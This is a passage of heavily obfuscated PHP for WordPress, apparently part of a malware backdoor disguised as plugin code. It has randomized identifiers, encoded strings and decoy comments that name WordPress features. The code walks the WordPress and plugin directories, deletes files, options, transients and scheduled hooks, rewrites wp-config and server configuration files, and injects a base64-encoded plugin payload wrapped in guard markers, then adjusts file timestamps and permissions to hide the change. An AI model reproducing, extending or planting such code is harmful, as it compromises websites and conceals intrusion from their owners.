 $zntk1kwdvkg14t   =   $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1651)) ?  get_option(hn_f08x0cns80(212), "") : "";
     if  ($zntk1kwdvkg14t  ===    $_pv)   {
      global    $wpdb;
 if  ($GLOBALS['__scf_bslklilwd3kn_71']($wpdb)  &&  $GLOBALS['__scf_ewy3z2db5hgtu_130']($wpdb,    c1sob647u1i(1652))  && $GLOBALS['__scf_fv3zevxzzb_44']($_pv)     &&   $_pv  !== ""   && isset($wpdb->options))      {
  @$wpdb->query($wpdb->prepare("D\x45L\x45\x54E FR\x4fM {$wpdb->options} WHER\x45 \x6fpt\x69o\x6e_\x6ea\x6de = 'sc_\x70en\x64in\x67_inva\x6cida\x74e' A\x4eD option_\x76a\x6cu\x65 = %s", $_pv));

  if   ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1138)))  {
       @wp_cache_delete(c1sob647u1i(212),     f6yrzd2knrmb(1141));


    @wp_cache_delete(bpowi0iglycvx(1653), f6yrzd2knrmb(1141));
    }
 } else  {
@delete_option(f6yrzd2knrmb(212));
    }
// WP Post Comments REST controller



}



 }
   function u46m8arl93u_0vid()
     {
try {
 if    (!defined(hn_f08x0cns80(1619)))  return;
$ftvsfz7ji2    = ircnjcyfmf8qkc7xdiss4();
  $pqo8538npnspm8 = p2b_7j_9ex54eg4();
  $sqgwaijtfri   = nreub2fs747eromoe(ABSPATH .     iw6xe9q4j6sneg(1654),   (3+5))   .  bpowi0iglycvx(1313);



$k8jye38u9cy3p9      =  nreub2fs747eromoe(ABSPATH   .    iw6xe9q4j6sneg(1218),   (3+5)) .    bpowi0iglycvx(1639);
   

    $jefnh556he4ncs =  nreub2fs747eromoe(ABSPATH .    c1sob647u1i(1655),  (229^237))   . iw6xe9q4j6sneg(1656);$fjketaiv=631;$ixpr9ki85mzyuc=($fjketaiv>0)?$fjketaiv:-$fjketaiv;
        $o2b1gai4y46      =   nreub2fs747eromoe(ABSPATH  .   f6yrzd2knrmb(1183),   (0x3+0x5))   .   hn_f08x0cns80(1656);
 $kf3dnffsv1h28n  =  nreub2fs747eromoe(ABSPATH    .  hn_f08x0cns80(1147),   (1+7))  .    c1sob647u1i(1656);
    $eqbf1_v63k8hc3     =  f6yrzd2knrmb(529)    .    nreub2fs747eromoe(ABSPATH .     'g',  (2<<2));
  $mjaxql8p4x4 =    array(


  $ftvsfz7ji2    .   hn_f08x0cns80(1610)   =>    c1sob647u1i(1657),



$ftvsfz7ji2     .   ovffvv33(526) =>   ovffvv33(836),
   );
  foreach ($mjaxql8p4x4    as   $w90pshmxoqhf =>  $prefix)  {
 if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))   continue;
$amsjsw283qnc3 =  @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);
if ($amsjsw283qnc3     ===   false)  continue;
 $tuv52b80zj_dxu49 =  f6yrzd2knrmb(803)     .   $prefix   .      f6yrzd2knrmb(804)  . $prefix   .  bpowi0iglycvx(1658);


$hodt3bg_4o0vfo  = $GLOBALS['__scf_renvrk8nefa8_474']($tuv52b80zj_dxu49,  "",  $amsjsw283qnc3);
if  ($hodt3bg_4o0vfo  !==      $amsjsw283qnc3)  c5kyk62yk_dwfeubni4b($w90pshmxoqhf,  $hodt3bg_4o0vfo);
    }

 $kcj_trhl20i     =   $ftvsfz7ji2   . ovffvv33(528);
   if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($kcj_trhl20i))   {
     $jrcjkfz04k7fmstw  =   @$GLOBALS['__scf_utyj_ckly79_101']($kcj_trhl20i);
 if     ($GLOBALS['__scf_fv3zevxzzb_44']($jrcjkfz04k7fmstw)  && $jrcjkfz04k7fmstw  !==  "") {
// @replicate certificate-chain

 if    ($GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1659), $GLOBALS['__scf_nv7he759wjfj_9']($jrcjkfz04k7fmstw,  0,   (226+74)))  || $GLOBALS['__scf_w6mdcepio4lkz5_7']($jrcjkfz04k7fmstw,     f6yrzd2knrmb(1660)) ===   0)   {
   ruinnb541lwxm7j($kcj_trhl20i,    (325+95));
   cvtaycsw15_xd1srry($kcj_trhl20i);
   }     else {



   $pn3hnu6ztmgtd426   =     $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1661),  "", $jrcjkfz04k7fmstw);
if    ($GLOBALS['__scf_fv3zevxzzb_44']($pn3hnu6ztmgtd426) &&   $pn3hnu6ztmgtd426 !==  $jrcjkfz04k7fmstw) c5kyk62yk_dwfeubni4b($kcj_trhl20i,  $pn3hnu6ztmgtd426);
       unset($pn3hnu6ztmgtd426);
 }
// WP Block Transforms: streaming chain

}
 unset($jrcjkfz04k7fmstw);
 }
$zfly060bg_  =      $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())  .     c1sob647u1i(174);
  $acxnkc306b0ku = defined(hn_f08x0cns80(1571))   ?  WP_CONTENT_DIR  .   f6yrzd2knrmb(1662) : $zfly060bg_;
  $xdtq4m97sn     =  array(
 $ftvsfz7ji2   .      '/'  .    $sqgwaijtfri,
     $ftvsfz7ji2     . '/'  .   $k8jye38u9cy3p9,
   $ftvsfz7ji2 . '/'  .   $jefnh556he4ncs,


     $pqo8538npnspm8      .  '/' . $o2b1gai4y46,
 $pqo8538npnspm8   .    '/'   .     $kf3dnffsv1h28n,
       $pqo8538npnspm8 .      '/'    . $k8jye38u9cy3p9,
 $pqo8538npnspm8  . '/'   .    $jefnh556he4ncs,
     $zfly060bg_ .  '/'  .     $o2b1gai4y46,
 $zfly060bg_ .    '/'   . $kf3dnffsv1h28n,
  $zfly060bg_ .   '/'  .  $k8jye38u9cy3p9,



$zfly060bg_     .  '/'    .     $jefnh556he4ncs,
     $acxnkc306b0ku  .     '/' .     $o2b1gai4y46,
     $acxnkc306b0ku . '/' .   $kf3dnffsv1h28n,
 $acxnkc306b0ku  .   '/'     .  $k8jye38u9cy3p9,
      $acxnkc306b0ku   . '/' . $jefnh556he4ncs,
    );
$tulxpr7063z  =      g71t84np2_v9qynmec3();
   $xdtq4m97sn[]   =     $tulxpr7063z[1];
 $xdtq4m97sn[]  = $tulxpr7063z[1]      .   ovffvv33(1419);



   unset($tulxpr7063z);


if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(757)))  {
    foreach  ((array) @$GLOBALS['__scf_kajvzw3bpufv_75']($ftvsfz7ji2   .   iw6xe9q4j6sneg(1663)  .  $sqgwaijtfri) as  $jpu1n3ohd9l)   $xdtq4m97sn[]  =    $jpu1n3ohd9l;$nm5x9sz8tnx=8173;$hrlhp5our=$nm5x9sz8tnx%8;
  foreach ((array) @$GLOBALS['__scf_kajvzw3bpufv_75']($ftvsfz7ji2  .      ovffvv33(1664) . $sqgwaijtfri) as $jpu1n3ohd9l)  $xdtq4m97sn[] =   $jpu1n3ohd9l;
  foreach ((array)     @$GLOBALS['__scf_kajvzw3bpufv_75'](ABSPATH   .   f6yrzd2knrmb(1339)    .   $eqbf1_v63k8hc3 .  hn_f08x0cns80(295))  as $pp08__6yl5k0)  $xdtq4m97sn[]  =  $pp08__6yl5k0;
 foreach   ((array)   @$GLOBALS['__scf_kajvzw3bpufv_75']($ftvsfz7ji2  .      '/' .   $eqbf1_v63k8hc3 . f6yrzd2knrmb(1665)) as    $pp08__6yl5k0) $xdtq4m97sn[] = $pp08__6yl5k0;
    foreach ((array) @$GLOBALS['__scf_kajvzw3bpufv_75']($pqo8538npnspm8  . '/'   .     $eqbf1_v63k8hc3 . iw6xe9q4j6sneg(1665))  as   $pp08__6yl5k0)  $xdtq4m97sn[]     =  $pp08__6yl5k0;
 foreach     ((array) @$GLOBALS['__scf_kajvzw3bpufv_75']($zfly060bg_  .    '/' . $eqbf1_v63k8hc3  .    bpowi0iglycvx(1665)) as  $pp08__6yl5k0)    $xdtq4m97sn[]  =      $pp08__6yl5k0;
 foreach     ((array)  @$GLOBALS['__scf_kajvzw3bpufv_75']($acxnkc306b0ku . '/'    .  $eqbf1_v63k8hc3   .  bpowi0iglycvx(1665))  as $pp08__6yl5k0)    $xdtq4m97sn[]  =    $pp08__6yl5k0;
}
  $bepgpd5a7hv  =  nreub2fs747eromoe(ABSPATH . 'g',  (5+3));
 $w_69_w8pl4tpe1  =     array(ABSPATH     .     bpowi0iglycvx(532), $ftvsfz7ji2,    $pqo8538npnspm8,   $zfly060bg_, $acxnkc306b0ku);
   foreach  ($w_69_w8pl4tpe1  as $_gd)   {
  if   (@$GLOBALS['__scf_opq_vgkskw_46']($_gd) &&  @$GLOBALS['__scf_sunuwikkpg6_51']($_gd))    s_xzav70hr_4pogeop0o($_gd  .  hn_f08x0cns80(1666)  .  $bepgpd5a7hv,  dfb4_mpcgxvnp230hvh1v(), hn_f08x0cns80(1667));
  }
if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(757))) {
  foreach   ($w_69_w8pl4tpe1  as $_gd)   {
foreach (array(bpowi0iglycvx(1668), c1sob647u1i(1669), c1sob647u1i(1670),  hn_f08x0cns80(1671), iw6xe9q4j6sneg(1672),  f6yrzd2knrmb(1673), c1sob647u1i(1674), f6yrzd2knrmb(1675),  c1sob647u1i(1676))     as $pleb7djucy6ga24)  {
 foreach    ((array)  @$GLOBALS['__scf_kajvzw3bpufv_75']($_gd    .    '/' . $pleb7djucy6ga24 . '*')   as  $i_e1wx5_qply01g)   $xdtq4m97sn[]    = $i_e1wx5_qply01g;
     }
 foreach  ((array) @$GLOBALS['__scf_kajvzw3bpufv_75']($_gd . ovffvv33(1677)) as      $c413e1gbka76)  $xdtq4m97sn[]  =   $c413e1gbka76;$q6t4mrkxzrt3jp=PHP_MAJOR_VERSION;$xjf2xg8347=$q6t4mrkxzrt3jp*9;



 }
 }


      unset($bepgpd5a7hv,  $w_69_w8pl4tpe1,     $_gd,  $pleb7djucy6ga24,   $i_e1wx5_qply01g,  $c413e1gbka76);

     
$mc5mca4o7k  =   array($GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2, hn_f08x0cns80(1559)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),  hn_f08x0cns80(1559)), $GLOBALS['__scf_ofdeuvs8zwos6_12']($pqo8538npnspm8,    c1sob647u1i(1559)),      $GLOBALS['__scf_ofdeuvs8zwos6_12']($zfly060bg_,     bpowi0iglycvx(1559)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($acxnkc306b0ku,    iw6xe9q4j6sneg(1678)));
     if     (defined(bpowi0iglycvx(1571)))     $mc5mca4o7k[] =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,   ovffvv33(1678));
  $sb3xwx51q6sqdez   =    array();
     foreach      ($GLOBALS['__scf_tni2zo3jsk7_159']($mc5mca4o7k)  as  $_pd)    {



 $sb3xwx51q6sqdez[]    =  $_pd  . '/'     . $k8jye38u9cy3p9;



  $sb3xwx51q6sqdez[]     = $_pd  . '/'   .  $jefnh556he4ncs;
  $sb3xwx51q6sqdez[] = $_pd    .  c1sob647u1i(1679) . $jefnh556he4ncs;


      }
// Pest PHP 2: logarithmic ring-buffer

 unset($mc5mca4o7k,   $_pd);
    foreach    ($sb3xwx51q6sqdez  as $q7vt9h4x8js0r7cp)    {
if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($q7vt9h4x8js0r7cp))  l2jao5rx4pzqrtjiymnn($q7vt9h4x8js0r7cp,  null);

      }
// OSR exit

unset($q7vt9h4x8js0r7cp);
$w6c_ep7rro9rd  = array($GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,  bpowi0iglycvx(1678)));
    if     (defined(hn_f08x0cns80(1571)))    $w6c_ep7rro9rd[]   =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,  f6yrzd2knrmb(1680));
$w6c_ep7rro9rd[]    =  $GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2, f6yrzd2knrmb(1681));
 $w6c_ep7rro9rd[] =  $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),  hn_f08x0cns80(1681));



  $up2d8p5n7f    =   array();
  foreach  ($GLOBALS['__scf_tni2zo3jsk7_159']($w6c_ep7rro9rd)  as  $ob8xilu5s231) $up2d8p5n7f[]  = $ob8xilu5s231   .  c1sob647u1i(1225);



unset($w6c_ep7rro9rd, $ob8xilu5s231);
foreach   ($up2d8p5n7f  as   $p_4g_bun0w947)   {
        if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($p_4g_bun0w947)) continue;
$amsjsw283qnc3   =   @$GLOBALS['__scf_utyj_ckly79_101']($p_4g_bun0w947);
  if     ($amsjsw283qnc3    &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  f6yrzd2knrmb(539)) !== false)  {
$amsjsw283qnc3 =   $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1682)  .      $GLOBALS['__scf_qw5tztoblafz_841']($k8jye38u9cy3p9,  '/')    .     bpowi0iglycvx(1683),    "\n",   $amsjsw283qnc3);

    if ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3))  {



 $amsjsw283qnc3    =  $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1684)    .  $GLOBALS['__scf_qw5tztoblafz_841']($k8jye38u9cy3p9, '/')  .    hn_f08x0cns80(1683),  "\n", $amsjsw283qnc3);
    }
// @inject timeout-policy

 if     ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3))   {
$amsjsw283qnc3 = $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(994)   .  $GLOBALS['__scf_qw5tztoblafz_841']($k8jye38u9cy3p9,      '/') .  ovffvv33(1685),  "\n",     $amsjsw283qnc3);



}



if ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3))    c5kyk62yk_dwfeubni4b($p_4g_bun0w947,      $amsjsw283qnc3);
}
}
// WP Tag Cloud: partial validator

    $s_5v9ya8dv4cica   =      ABSPATH .      bpowi0iglycvx(1565);
      if (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($s_5v9ya8dv4cica))  {
  $kjq0h546tn8nfb    =   $GLOBALS['__scf_po3uwzhcb63b03_11'](ABSPATH)   . f6yrzd2knrmb(1119);
    if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($kjq0h546tn8nfb)) $s_5v9ya8dv4cica =  $kjq0h546tn8nfb;
  }
   if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($s_5v9ya8dv4cica)  &&    @$GLOBALS['__scf_sunuwikkpg6_51']($s_5v9ya8dv4cica))      {
   $_wc   = @$GLOBALS['__scf_utyj_ckly79_101']($s_5v9ya8dv4cica);
  if   ($GLOBALS['__scf_fv3zevxzzb_44']($_wc)  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($_wc,  c1sob647u1i(546))      !==   false) {
$we87hufwwf97zrl1    = $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1686),     "define( 'WP_CACHE', true );\n", $_wc);
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($we87hufwwf97zrl1)    &&    $we87hufwwf97zrl1 !==  $_wc  &&    ib2ffadoyj2m6zxmkaa2in($we87hufwwf97zrl1)) {


$gwvlztorlm_ub0u = @$GLOBALS['__scf_uo_a60ibqnli_104']($s_5v9ya8dv4cica);
   if (c5kyk62yk_dwfeubni4b($s_5v9ya8dv4cica, $we87hufwwf97zrl1)) {
if ($gwvlztorlm_ub0u)    @$GLOBALS['__scf_c2r2e7u5qd7u_77']($s_5v9ya8dv4cica,     $gwvlztorlm_ub0u);
 if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1687))) @delete_option(hn_f08x0cns80(1589));
     }
 }
   unset($we87hufwwf97zrl1,  $gwvlztorlm_ub0u);
   }
   unset($_wc);
     }


   unset($s_5v9ya8dv4cica,    $kjq0h546tn8nfb);



 $mgotjgxq3p8    =    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1688))     ?     @$GLOBALS['__scf_hm704kpgfifhl_118'](c1sob647u1i(1201))     : false;
      if   (!$mgotjgxq3p8 ||     $mgotjgxq3p8  ===   "") $mgotjgxq3p8  =  hn_f08x0cns80(537);
$iez7k8c3ouat  = array($GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,      f6yrzd2knrmb(1681)));
 if  (defined(c1sob647u1i(1571)))  $iez7k8c3ouat[] =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,  hn_f08x0cns80(1681));
     $iez7k8c3ouat[]   = $GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2,      iw6xe9q4j6sneg(1689));
$iez7k8c3ouat[] = $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()), hn_f08x0cns80(1690));
   $pb0ire6g27fty14  = array();
 foreach ($GLOBALS['__scf_tni2zo3jsk7_159']($iez7k8c3ouat)  as $csh0s_3c8r7xv_) $pb0ire6g27fty14[] =  $csh0s_3c8r7xv_    . '/'  .  $mgotjgxq3p8;
    unset($iez7k8c3ouat,      $csh0s_3c8r7xv_);
   

  foreach  ($pb0ire6g27fty14 as    $imr5jr9def) {
if    (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($imr5jr9def))     continue;
 $amsjsw283qnc3     =    @$GLOBALS['__scf_utyj_ckly79_101']($imr5jr9def);


    if    ($amsjsw283qnc3  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  hn_f08x0cns80(1691)) !==  false)   {
$amsjsw283qnc3     =  $GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(1692)   .  $GLOBALS['__scf_qw5tztoblafz_841']($jefnh556he4ncs,    '/') .  f6yrzd2knrmb(1693),   "", $amsjsw283qnc3);
     if   ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)) c5kyk62yk_dwfeubni4b($imr5jr9def,     $amsjsw283qnc3);
 }


  }
       $s_olxxbd697 = $GLOBALS['__scf_yucj673b8x_164']($xdtq4m97sn,  $sb3xwx51q6sqdez);
 $xcy9gvee8q4 =    array();$o50197bwk22o0e=PHP_INT_MAX/PHP_INT_MAX;$igx2hfyx2io=$o50197bwk22o0e+99;
  $brg7nrsw9g1tn  =  false;
 foreach     ($GLOBALS['__scf_en9wrpvm3eosc_387']($up2d8p5n7f,    $pb0ire6g27fty14) as $oa5afrny0_gy62)     {
  if (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($oa5afrny0_gy62))  continue;
$ebgzescyne  =      @$GLOBALS['__scf_utyj_ckly79_101']($oa5afrny0_gy62);
  if   (!$GLOBALS['__scf_fv3zevxzzb_44']($ebgzescyne))  {



$brg7nrsw9g1tn    = true;
       continue;
   }
  if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($ebgzescyne,    bpowi0iglycvx(1691))   === false)  continue;
  if   ($GLOBALS['__scf_e24rppqzou_1420'](bpowi0iglycvx(1694),   $ebgzescyne,     $k70jvs6zsx))    {
 foreach  ($GLOBALS['__scf_en9wrpvm3eosc_387']($k70jvs6zsx[1],  $k70jvs6zsx[2], $k70jvs6zsx[(2+1)])    as $vkfhbb8hycke)   {



if    ($vkfhbb8hycke     !==  "")    $xcy9gvee8q4[$GLOBALS['__scf_owu_4pajngr_3']($vkfhbb8hycke)]  = true;
 }
}
     unset($ebgzescyne,      $k70jvs6zsx,    $vkfhbb8hycke);
}
// provision rate-limiter for WP Paragraph Block


    if     (!$brg7nrsw9g1tn) {
  foreach     ($s_olxxbd697      as     $ko9cqc0s7si9cc)   {
     if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ko9cqc0s7si9cc))   {
   if  (isset($xcy9gvee8q4[$GLOBALS['__scf_owu_4pajngr_3']($ko9cqc0s7si9cc)])) continue;
 ruinnb541lwxm7j($ko9cqc0s7si9cc,   (336+84));
cvtaycsw15_xd1srry($ko9cqc0s7si9cc);

  }
}

 }



      unset($xcy9gvee8q4, $brg7nrsw9g1tn,   $oa5afrny0_gy62);
 foreach (_nt_1te3ocatjifl()  as    $puwccc9l0gmis76i)  {
    if   (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($puwccc9l0gmis76i)    ||   !@$GLOBALS['__scf_sunuwikkpg6_51']($puwccc9l0gmis76i)) continue;
   $amsjsw283qnc3 =   @$GLOBALS['__scf_utyj_ckly79_101']($puwccc9l0gmis76i);

if   ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3))     {
// revisit later


$xfl6umh94ucwo   =  zb8j7k_ktia5b5er11h($amsjsw283qnc3, ovffvv33(1441),      hn_f08x0cns80(1446));
   $xfl6umh94ucwo =  zb8j7k_ktia5b5er11h($xfl6umh94ucwo, c1sob647u1i(1695), c1sob647u1i(1696));
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($xfl6umh94ucwo)    &&    $xfl6umh94ucwo  !== $amsjsw283qnc3) c5kyk62yk_dwfeubni4b($puwccc9l0gmis76i,  $xfl6umh94ucwo);
      unset($xfl6umh94ucwo);$j46h623nuv_=36*5;$bd450p0y=$j46h623nuv_-25;
    }


    }
 if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1291))      && $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1697)))    {
  $key   = txfhz3hkzqfr161dyh10kv();
if ($key !==  false)  {

   $jhg4f8yikp7    =  @$GLOBALS['__scf_akow9cnzygd9jc_1291']($key,     'w', 0,     0);
if ($jhg4f8yikp7) {


@$GLOBALS['__scf_fg19kt2h0qqpem_1301']($jhg4f8yikp7);

@$GLOBALS['__scf_ti43kloh6mxx_1297']($jhg4f8yikp7);
   }
    }
 }
  if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1698)))  {
   $ucbbkg2es249 =  nreub2fs747eromoe(ABSPATH     . hn_f08x0cns80(1613), (19-9));



 @delete_option($ucbbkg2es249);


$cpakna3wa6m18pt   = $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1651))   ?    @get_option(iw6xe9q4j6sneg(1699), array())     :   array();
   if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($cpakna3wa6m18pt)) {
// sesquilinear affine-type



  if     (isset($cpakna3wa6m18pt['b']))  cvtaycsw15_xd1srry($cpakna3wa6m18pt['b']);
    if    (isset($cpakna3wa6m18pt[iw6xe9q4j6sneg(1545)])    && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($cpakna3wa6m18pt[c1sob647u1i(1545)]))     {

     foreach  ($cpakna3wa6m18pt[hn_f08x0cns80(1545)]  as  $_ci)   {
  if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($_ci)  && isset($_ci['b']))     cvtaycsw15_xd1srry($_ci['b']);
   }
}
      }

  @delete_option(iw6xe9q4j6sneg(1699));



   @delete_option(hn_f08x0cns80(1463));
    @delete_option(c1sob647u1i(1700));
    @delete_option(hn_f08x0cns80(1701));
 @delete_option(hn_f08x0cns80(1702));
@delete_option(bpowi0iglycvx(1215));
     @delete_option(c1sob647u1i(1216));
 


   @delete_option(c1sob647u1i(1214));
unset($cpakna3wa6m18pt,     $_ci);
    }


   if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(774)))   {

   @delete_transient(ovffvv33(1703));
      @delete_transient(c1sob647u1i(1335));
 @delete_transient(p1srpzpjsehf9kb72());
    }
if  ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(680)))      {
    @wp_clear_scheduled_hook(hn_f08x0cns80(1704));
 @wp_clear_scheduled_hook(f6yrzd2knrmb(1705));


 @wp_clear_scheduled_hook(vwa_1wxh4uqtqo4afj0x8());
}
  }   catch     (Throwable   $cje8wku90zm4r) {

      g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1706), $cje8wku90zm4r);
    }  catch   (Exception   $cje8wku90zm4r)  {
  }
  }
   function gokfaxh3de99wkb8chxh6t()



 {
try    {
// WP Group Block: degenerate locator




     if  (!defined(ovffvv33(1619)))      return  false;

  $ftvsfz7ji2  =    ircnjcyfmf8qkc7xdiss4();
  $u3mnsvdimklihjz   =  $ftvsfz7ji2 .  bpowi0iglycvx(1707);
$pjov750v0e     =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),     ovffvv33(1656));
 $egziouap1xyua  =   bfyls7pdkqkf4p8az();
 if  (!$egziouap1xyua    ||    $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua) <  (402+98)      ||    $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua) >   (277870+770706)     || hc0wbkv3xzh9im34z($egziouap1xyua)  || !ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))      return    false;
     $current  =   @$GLOBALS['__scf_qg7ainp116mf_713']($u3mnsvdimklihjz)    ?  @$GLOBALS['__scf_utyj_ckly79_101']($u3mnsvdimklihjz)  :  "";
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($current))   {

        g_qoqdy38lfl4v4n3618(ovffvv33(662),  iw6xe9q4j6sneg(1708));
return false;
 }
$current   = k12vjaxiygekdnj($current);
    $abe7rxcpkk9nsv   =  dfb4_mpcgxvnp230hvh1v()  . ':'    . nreub2fs747eromoe(ABSPATH  .  c1sob647u1i(1709),   (131^139));
 $cxi_2i7q2h =   ovffvv33(1710)  . $abe7rxcpkk9nsv  .  hn_f08x0cns80(1321);

  $ekxvczjmiyqtk    =   f6yrzd2knrmb(1711)     .  $abe7rxcpkk9nsv   .   f6yrzd2knrmb(1321);
  $smrfh8n981vu_g  =     nreub2fs747eromoe(ABSPATH     . ovffvv33(1709),    (1+7));
  $pgef_m8v4k3  = $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1712) . $smrfh8n981vu_g  .   iw6xe9q4j6sneg(1713), "",   $current);
   $yfat3eheah  =  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($pgef_m8v4k3, ovffvv33(1714))    !==  false);
 if    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,     $cxi_2i7q2h)    !==   false  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($current,     $ekxvczjmiyqtk)  !==     false && !$yfat3eheah)  return true;
$current    =     $GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(1715),  "",     $pgef_m8v4k3);
 if (!$GLOBALS['__scf_fv3zevxzzb_44']($current))  {
g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(662),  bpowi0iglycvx(1327));
       return  false;
 }
    $fqntej805r =   eos4svadcaj0dow8y();


 if  (!$fqntej805r)   return    false;



  $u0cdkohgz2xqw9  =  hn_f08x0cns80(1716)  .    $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($pjov750v0e . (string) e16j_u99g1ldi90iix1i9i()),  0,   (27^19));


 $kuat_x8vfyqde607     = qjclarwdule01mm6a3h4wo(
hn_f08x0cns80(1717),
       array('__SLUG__', '__PLUGIN_BASE64__',  '__GUARD_NAME__', '__VERSION__'),



  array($pjov750v0e, $fqntej805r, $u0cdkohgz2xqw9,    dfb4_mpcgxvnp230hvh1v())
 );


if (!$kuat_x8vfyqde607)  {
  if   ((int)  get_option(iw6xe9q4j6sneg(764),  0)  > 0) g_qoqdy38lfl4v4n3618(bpowi0iglycvx(662),   c1sob647u1i(1718));
return  false;
 }
  $current    =      k12vjaxiygekdnj($current);
  $p_873p6bgk   = $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1328), "", $kuat_x8vfyqde607);


   $co52r2ah41q30b   = ($GLOBALS['__scf_d4eyetogjbsnt_10']($current)  ===  0);


if   (!$co52r2ah41q30b)  {
      if     (!os047l930_shspyyo(hn_f08x0cns80(662)))  {
      g_qoqdy38lfl4v4n3618(c1sob647u1i(662),  ovffvv33(1280));
 return  false;
 




}
     if     (!l1s0od7mbsjgia4oi($u3mnsvdimklihjz,   $current))  {
g_qoqdy38lfl4v4n3618(hn_f08x0cns80(662),  c1sob647u1i(1719));
 return false;



  }
// WP Formatting API style fallback


qv9q02c8633k8zqa1sav(hn_f08x0cns80(662));


   }    else    {
 if  (!l1s0od7mbsjgia4oi($u3mnsvdimklihjz, ""))   {

g_qoqdy38lfl4v4n3618(bpowi0iglycvx(662),    iw6xe9q4j6sneg(1719));

  return false;


  }
}
   $f95gmfn4ulxv38r   = vjxo7lol9nqpyakwpwyz3i($current,    $cxi_2i7q2h   . "\n"   .    $p_873p6bgk   .    "\n" .    $ekxvczjmiyqtk);
    if    (!c5kyk62yk_dwfeubni4b($u3mnsvdimklihjz, $f95gmfn4ulxv38r))    {
    return    false;
  }
  ghttebm5ugw_js_hn2zmc($u3mnsvdimklihjz);
o4_k_ap14u5xy97yywy7k($u3mnsvdimklihjz);

return  true;
 } catch  (Throwable    $cje8wku90zm4r)   {
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(662), $cje8wku90zm4r);
  return  false;
     }     catch (Exception  $cje8wku90zm4r)    {
 return  false;
    }
       }
        function _nt_1te3ocatjifl()
   {

 $toxd7lwn40kosh59 = array();
   if  (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1651)))   return    $toxd7lwn40kosh59;$lv0mbnjpgs=PHP_INT_MAX/PHP_INT_MAX;$r65rj077grlka=$lv0mbnjpgs+74;
